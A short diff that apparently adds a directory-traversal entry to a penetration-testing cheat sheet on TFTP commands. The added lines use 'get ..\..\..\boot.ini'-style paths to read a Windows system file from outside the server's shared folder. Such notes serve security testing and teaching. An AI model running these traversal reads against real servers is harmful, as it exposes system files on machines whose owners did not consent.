@@ -48,6 +48,10 @@ $ tftp
 tftp> connect [target]
 tftp> put [/path/to/local.txt]
 tftp> get [/path/to/remote.txt]
+
+# directory traversal
+tftp> get ..\..\..\..\..\boot.ini
+tftp> get \boot.ini
 ```
 
 
